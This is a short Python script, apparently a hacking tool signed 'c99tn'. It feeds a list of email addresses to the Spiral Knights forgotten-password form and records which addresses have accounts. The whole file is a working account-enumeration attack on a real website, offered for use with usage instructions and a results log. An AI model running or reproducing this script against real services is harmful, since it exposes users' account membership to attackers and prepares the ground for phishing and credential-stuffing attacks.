import mechanize
from mechanize import urlopen


b = mechanize.Browser()

url = "https://www.spiralknights.com/register/forgot.wm"

mail = open('maillist.txt','r').readlines()

i = 0

print("""
   _____       _            __   __ __       _       __    __      
  / ___/____  (_)________ _/ /  / //_/____  (_)___ _/ /_  / /______
  \__ \/ __ \/ / ___/ __ `/ /  / ,<  / __ \/ / __ `/ __ \/ __/ ___/
 ___/ / /_/ / / /  / /_/ / /  / /| |/ / / / / /_/ / / / / /_(__  ) 
/____/ .___/_/_/   \__,_/_/  /_/ |_/_/ /_/_/\__, /_/ /_/\__/____/  
    /_/                                    /____/               
                                               
                                                    Coded by c99tn 
   [+] usage: python sk.py
   [+] PS: Put emails in maillist.txt only!!
   

""")

for line in mail:

    response = b.open(url)
    
    b.select_form(nr=0)

    b.form['email'] = mail[i]

    b.method = "POST"
    response = b.submit()
    web = response.read()
    rzltf = web.find(b'matched')
    
    print( mail[i] )
    if rzltf == 1142:
        print("YES !!!!!! *__* saved in rzlt.txt ")
        with open('rzlt.txt', 'a') as f:
    	    print(mail[i] + " - Has a SK account ;)", file=f)
    elif rzltf == -1:
        print("Nooo.....")
    print("________________")
    i=i+1


